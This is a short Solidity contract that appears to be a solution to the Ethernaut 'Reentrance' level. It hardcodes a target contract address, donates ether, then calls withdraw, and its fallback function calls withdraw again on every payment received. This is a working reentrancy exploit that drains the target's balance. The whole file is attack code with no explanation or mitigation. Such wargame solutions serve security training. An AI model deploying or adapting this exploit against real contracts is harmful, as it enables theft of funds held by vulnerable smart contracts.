// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract Ethernaut10 {
    IReentrance reentrance =
        IReentrance(0x722e79Ec73dc11070f9f668B1d30b19438D0c8fb);
    uint256 val;

    constructor() {}

    function start() public payable {
        reentrance.donate{value: msg.value}(address(this));
        val = msg.value;
        reentrance.withdraw(val);
    }

    fallback() external payable {
        reentrance.withdraw(val);
    }
}
